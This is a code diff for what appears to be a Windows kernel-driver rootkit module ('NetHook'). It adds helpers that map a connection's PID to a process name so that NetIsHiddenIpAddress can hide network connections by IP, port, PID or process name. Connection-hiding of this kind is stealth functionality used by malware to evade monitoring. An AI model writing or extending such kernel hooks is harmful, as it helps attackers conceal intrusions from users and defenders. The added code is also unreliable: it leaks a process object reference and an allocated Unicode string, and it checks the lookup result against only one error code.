@@ -25,6 +25,49 @@ NTSTATUS NetHook::InitNetworkHook()
 	return status;
 }
 
+typedef PCHAR(*GET_PROCESS_IMAGE_NAME) (PEPROCESS Process);
+GET_PROCESS_IMAGE_NAME gGetProcessImageFileName;
+char* GetProcessNameFromPid(HANDLE pid)
+{
+	PEPROCESS Process;
+	if (PsLookupProcessByProcessId(pid, &Process) == STATUS_INVALID_PARAMETER)
+	{
+		return "pid???";
+	}
+	UNICODE_STRING sPsGetProcessImageFileName = RTL_CONSTANT_STRING(L"PsGetProcessImageFileName");
+	gGetProcessImageFileName = (GET_PROCESS_IMAGE_NAME)MmGetSystemRoutineAddress(&sPsGetProcessImageFileName);
+	// To use it
+	if (NULL != gGetProcessImageFileName)
+	{
+		PCHAR pImageName = gGetProcessImageFileName(Process);
+		return pImageName;
+	}
+	return "";
+}
+
+// TCP PID belongs to the list of process name.
+BOOLEAN DoesPIDBelongToProcessName(
+	_In_ const ULONG ConnectPID,
+	_In_ const UNICODE_STRING& processName)
+{
+	// Validity Test
+	if ((ConnectPID == 0) || (processName.Buffer == nullptr) || (processName.Length == 0))
+	{
+		return FALSE;
+	}
+	
+	PCSZ process = (PCSZ)GetProcessNameFromPid((HANDLE)ConnectPID);
+	ANSI_STRING processAnsiString{};
+	UNICODE_STRING processUnicodeString{};
+	RtlInitAnsiString(&processAnsiString, process);
+	RtlAnsiStringToUnicodeString(&processUnicodeString, &processAnsiString, TRUE);	
+	if (0 == RtlCompareUnicodeString(&processUnicodeString, &processName, TRUE))
+	{
+		return TRUE;
+	}
+	return FALSE;
+}
+
 NTSTATUS NetHook::NetAddHiddenConnection(_In_ const PNETHOOK_HIDDEN_CONNECTION NewConnection)
 {
 	if ((NewConnection->IpAddress == 0) && 
@@ -158,7 +201,7 @@ BOOLEAN NetHook::NetIsHiddenIpAddress(_In_ const ULONG IpAddress,
 			(Port.port && (CurrentEntry->Connection->Port == Port.port)) ||
 			(RemoteIpAddress && (CurrentEntry->Connection->RemoteIpAddress == RemoteIpAddress)) ||
 			(ConnectPID && (CurrentEntry->Connection->ConnectPID == ConnectPID)) || 
-			(ConnectPID && HideProcess::DoesPIDBelongToProcessName(ConnectPID, CurrentEntry->Connection->ConnectProcess)))
+			(ConnectPID && DoesPIDBelongToProcessName(ConnectPID, CurrentEntry->Connection->ConnectProcess)))
 		{
 			return TRUE;
 		}
